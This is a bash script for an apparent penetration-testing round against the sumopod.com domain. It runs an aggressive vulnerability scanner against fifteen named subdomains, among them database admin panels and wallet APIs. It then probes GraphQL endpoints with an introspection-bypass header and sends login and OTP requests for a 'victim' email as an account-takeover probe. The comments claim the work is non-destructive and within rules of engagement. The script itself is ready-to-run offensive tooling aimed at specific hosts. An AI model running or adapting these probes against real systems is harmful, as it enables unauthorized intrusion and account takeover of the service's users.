#!/bin/bash
# Round-4: upgraded KOBRA (authflow/multitenant/ssrf_oob + context-aware XSS)
# Target sumopod surface of interest. Within RoE (non-destructive).
OUT=/tmp/sumopod_r4
mkdir -p $OUT
export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin:$HOME/.cargo/bin:/home/shenyo1/.local/bin

# Interesting hosts from round-1/3 recon
HOSTS="https://api-proxy-tencent-service.sumopod.com https://dbgate.sumopod.com https://phpmyadmin.sumopod.com https://n8x.sumopod.com https://mail-panel.sumopod.com https://waha-dashboard.sumopod.com https://ai.sumopod.com https://ai2.sumopod.com https://chat.sumopod.com https://console-app.sumopod.com https://api-gate-v2.sumopod.com https://r2-cdn.sumopod.com https://api-wallet.sumopod.com https://api-wallet-management.sumopod.com https://api-agency.sumopod.com"

echo "=== [A] KOBRA crazy (upgraded) on interesting hosts ==="
for h in $HOSTS; do
  echo ">> $h"
  timeout 120 kobra -t "$h" -m crazy -o "$OUT/scan_$(echo $h | sed 's|https://||;s|/||g').json" 2>/dev/null
done

echo "=== [B] GraphQL introspection bypass (enriched) ==="
for h in https://ai.sumopod.com https://ai2.sumopod.com https://chat.sumopod.com https://console-app.sumopod.com https://api-gate-v2.sumopod.com https://n8x.sumopod.com; do
  for hdr in "" "X-Introspection: enabled"; do
    if [ -z "$hdr" ]; then
      curl -s --max-time 12 -X POST "$h/graphql" -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){name}}"}' -o "$OUT/gql_$(echo $h|sed 's|https://||').txt" 2>/dev/null
    else
      curl -s --max-time 12 -X POST "$h/graphql" -H "Content-Type: application/json" -H "$hdr" -d '{"query":"{__type(name:\"User\"){name}}"}' -o "$OUT/gql_$(echo $h|sed 's|https://||')_introspect.txt" 2>/dev/null
    fi
  done
done

echo "=== [C] authflow ATO probe (POST, non-destructive) ==="
for h in https://sumopod.com https://api-gate-v2.sumopod.com https://ai.sumopod.com; do
  for ep in /send-code /api/send-code /login /api/login /otp/send /api/otp; do
    code=$(curl -s -o "$OUT/ato_$(echo $h|sed 's|https://||')_$(echo $ep|sed 's|/||g').txt" -w "%{http_code}" --max-time 12 -X POST "$h$ep" -H "Content-Type: application/json" -d '{"email":"victim@sumopod.com"}' 2>/dev/null)
    echo "$h$ep -> $code"
  done
done

echo "R4_DONE"